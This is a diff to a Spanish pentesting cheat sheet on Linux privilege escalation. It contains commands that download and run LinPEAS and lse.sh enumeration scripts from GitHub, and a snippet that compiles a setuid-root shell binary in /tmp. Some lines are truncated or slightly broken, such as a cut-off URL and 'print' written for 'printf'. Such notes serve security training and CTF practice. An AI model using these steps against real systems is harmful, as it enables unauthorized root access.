@@ -6,7 +6,7 @@ información del sistema, procesos y archivos para localizar vectores de escalad
 **LinPEAS**: Script impresionante de escalada de privilegios de Linux
 
 ```sh
-wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" ./linpeas.sh -a #all checks - enumeración más profunda del sistema, pero lleva más tiempo
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"  ./linpeas.sh -a #all checks - enumeración más profunda del sistema, pero lleva más tiempo
 ./linpeas.sh -s #superfast & sigilo: esto evitará algunas comprobaciones que consumen mucho tiempo
 ./linpeas.sh -P #Pasar
 ```
@@ -14,7 +14,7 @@ wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.s
 **LinuxSmartEnumeration**: herramientas de enumeración de Linux para pentesting y CTF
 
 ```sh
-wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/ma curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/ma ./lse.sh -l1 # muestra información interesante que debería ayudarte a privesc
+wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/ma ./lse.sh -l1 # muestra información interesante que debería ayudarte a privesc
 ./lse.sh -l2 #
 ```
 
@@ -225,7 +225,6 @@ Puedes usar `pspy` para detectar un trabajo CRON.
 ```sh
 ./pspy64 -pf -i 1000
 ```
-
 ### Systemd timers
 
 ```sh
@@ -260,7 +259,8 @@ find / -uid 0 -perm -4000 -type f 2>/dev/null
 | setgid()   | establece el ID de grupo efectivo del proceso de llamada          |
 
 ```sh
-print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   gcc -o /tmp/suid /tmp/suid.c  
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+gcc -o /tmp/suid /tmp/suid.c  
 sudo chmod +x /tmp/suid # execute right 
 sudo chmod +s /tmp/suid # setuid
 ```
